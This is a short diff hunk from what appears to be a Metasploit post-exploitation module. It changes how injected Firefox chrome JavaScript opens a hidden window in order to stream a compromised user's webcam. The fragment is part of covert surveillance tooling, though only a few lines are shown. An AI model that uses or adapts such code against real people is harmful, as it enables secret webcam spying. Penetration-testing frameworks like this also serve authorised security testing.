@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Post
 
           var html = "#{Rex::Text.encode_base64(interface)}";
           var url = #{url};
-          AppShellService.hiddenDOMWindow.openDialog(url, 'xxx');
+          AppShellService.hiddenDOMWindow.open(url, '_self');
           send("Streaming webcam...");
 
         } catch (e) {
